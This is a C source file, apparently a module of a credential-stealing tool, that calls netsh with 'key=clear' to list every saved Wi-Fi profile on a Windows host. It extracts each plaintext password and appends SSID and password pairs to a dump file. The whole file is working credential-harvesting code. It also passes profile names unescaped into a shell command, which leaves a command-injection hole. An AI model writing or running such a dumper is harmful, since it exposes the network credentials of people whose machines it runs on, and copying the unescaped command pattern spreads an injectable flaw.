#include "..\include\wifi_dumper.h"

#define MAX_PROFILES 100
#define MAX_PROFILE_NAME 256

static void trim_newline(char *str)
{
        size_t len = strlen(str);

        if (len > 0 && str[len - 1] == '\n')
                str[len - 1] = '\0';
}

/*
 * ext_profiles - Extracts saved Wi-Fi profile names
 *
 * @prf: 2D array to store profile names
 * Return: total number of profiles found, or -1 on failure
 */
static int ext_profiles(char prf[MAX_PROFILES][MAX_PROFILE_NAME])
{
        FILE *fp;
        char line[MAX_LINE_LEN];
        int count = 0;

        fp = _popen("netsh wlan show profiles", "r");
        if (!fp)
                return -1;

        while (fgets(line, sizeof(line), fp) && count < MAX_PROFILES)
        {
                char *pos = strchr(line, ':');

                if (pos)
                {
                        pos++;
                        while (*pos == ' ')
                                pos++;

                        trim_newline(pos);
                        strncpy(prf[count], pos, MAX_PROFILE_NAME - 1);
                        prf[count][MAX_PROFILE_NAME - 1] = '\0';
                        count++;
                }
        }

        _pclose(fp);
        return count;
}

/*
 * run_dump_profiles - Dumps SSID and password for all saved Wi-Fi profiles
 */
void run_dump_profiles(struct Command *cmd)
{
        FILE *out;
        char prfs[MAX_PROFILES][MAX_PROFILE_NAME];
        int i, total;

        total = ext_profiles(prfs);
        if (total <= 0)
                return;

        out = fopen(OUTPUT_FILE, "a");
        if (!out)
                return;

        fprintf(out, "\n===== Wi-Fi SSID & Password Dump =====\n");

        for (i = 0; i < total; i++)
        {
                char command[MAX_CMD_LEN];
                FILE *fp;
                char line[MAX_LINE_LEN];
                char password[256] = {0};

                snprintf(command, sizeof(command),
                         "netsh wlan show profile name=\"%s\" key=clear", prfs[i]);

                fp = _popen(command, "r");
                if (!fp)
                        continue;

                while (fgets(line, sizeof(line), fp))
                {
                        if (strstr(line, "Key Content"))
                        {
                                char *start = strchr(line, ':');
                                if (start)
                                {
                                        start += 2; /* Skip ": " */
                                        strncpy(password, start, sizeof(password) - 1);
                                        password[sizeof(password) - 1] = '\0';
                                        trim_newline(password);
                                        break;
                                }
                        }
                }

                _pclose(fp);

                fprintf(out, "[+] SSID     : %s\n", prfs[i]);
                if (strlen(password))
                        fprintf(out, "[+] Password : %s\n\n", password);
                else
                        fprintf(out, "[-] Password : <None or Encrypted>\n\n");
        }

        fprintf(out, "=======================================\n");
        fclose(out);
}
